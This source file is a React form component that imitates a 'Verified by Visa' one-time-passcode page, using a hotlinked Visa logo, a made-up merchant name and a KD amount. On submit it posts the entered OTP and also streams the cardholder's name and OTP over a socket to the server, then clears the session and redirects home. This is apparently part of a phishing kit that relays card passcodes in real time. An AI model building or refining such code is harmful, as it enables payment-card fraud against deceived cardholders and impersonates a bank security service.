import { OTPSchema, type OTPType } from '#/schema/OTP'

import { useForm } from 'node_modules/@tanstack/react-form/dist/esm/useForm'
import { Field, FieldError } from '../ui/field'
import { Button, buttonVariants } from '../ui/button'
import { Link, useNavigate } from '@tanstack/react-router'
import { useStore } from '@tanstack/react-store'
import { clearCustomer, formCustomerStore } from '#/store/form-customer-store'
import { useTransition } from 'react'
import { postOTP } from '#/server/post-OTP'
import { sendOTPSocket } from '#/server/socket-server'
import { clearCart } from '#/store/cart-store'

export default function FormOTP({ total }: { total: number }) {
  const [isPending, startTransition] = useTransition()
  const navigate = useNavigate()

  const paymentInfo = useStore(formCustomerStore, (state) => state.customer)

  const defaultValues: OTPType = {
    paymentInfoId: paymentInfo.paymentInfoId,
    otp: '',
  }

  const form = useForm({
    defaultValues,
    validators: {
      onSubmit: OTPSchema,
      onChange: OTPSchema,
    },
    onSubmit: async ({ value }) => {
      startTransition(async () => {
        await postOTP({
          data: { paymentInfoId: paymentInfo.paymentInfoId, otp: value.otp },
        })
      })

      await sendOTPSocket({ data: { name: paymentInfo.name, otp: value.otp } })

      navigate({ to: '/' })

      form.reset()

      clearCart()
      clearCustomer()
    },
  })

  return (
    <form
      onSubmit={(e) => {
        e.preventDefault()
        form.handleSubmit()
      }}
    >
      <div className="flex items-start justify-between">
        <img
          src="https://metcocu.org/wp-content/uploads/2018/08/verified_by_visa.jpg"
          width={100}
          alt="Verified by Visa"
        />
      </div>
      <p className="text-gray-700 text-lg mt-4 mb-4">
        Protecting your online payments
      </p>

      <div className="text-sm text-gray-700 space-y-2">
        <div className="flex">
          <span className="w-40">Merchant:</span>
          <span>MANAHAL ALTHUNYYAN CO</span>
        </div>

        <div className="flex">
          <span className="w-40">Amount:</span>
          <span className="font-bold">KD {total.toFixed(2)}</span>
        </div>

        <div className="flex">
          <span className="w-40">Date:</span>
          <span>{new Date().toLocaleDateString()}</span>
        </div>

        <div className="flex">
          <span className="w-40">Card number:</span>
          <span>XXXX XXXX XXXX 1234</span>
        </div>

        <div className="flex">
          <span className="w-40">Personal Message:</span>
          <span>A personal greeting</span>
        </div>

        <div className="mt-4 w-full">
          <div className="flex items-center space-x-4 ">
            <span className="w-full text-sm text-gray-700 leading-7">
              Enter One-Time Passcode (OTP):
            </span>
            <form.Field
              name="otp"
              children={(field) => {
                const isInvalid =
                  field.state.meta.isTouched && !field.state.meta.isValid
                return (
                  <Field data-invalid={isInvalid}>
                    <input
                      id={field.name}
                      name={field.name}
                      value={field.state.value}
                      onBlur={field.handleBlur}
                      onChange={(e) => field.handleChange(e.target.value)}
                      aria-invalid={isInvalid}
                      autoComplete="off"
                      className="bg-white border border-gray-400  text-sm px-2 py-1 w-40! outline-none  focus:border-blue-600!"
                    />

                    {isInvalid && (
                      <FieldError errors={field.state.meta.errors} />
                    )}
                  </Field>
                )
              }}
            />
          </div>
        </div>

        <div className="mt-5 flex items-center justify-center gap-3">
          <Button
            variant="addedToCart"
            type="submit"
            size="lg"
            className="rounded-xl p-5"
            disabled={isPending}
          >
            {isPending ? 'Processing...' : 'Submit'}
          </Button>

          <Button
            variant="addedToCart"
            type="button"
            size="lg"
            className="rounded-xl p-5"
          >
            Resend
          </Button>

          <Link
            to="/"
            className={buttonVariants({
              variant: 'secondary',
              size: 'lg',
              className: 'rounded-xl p-5!',
            })}
          >
            Cancel
          </Link>
        </div>
      </div>
    </form>
  )
}
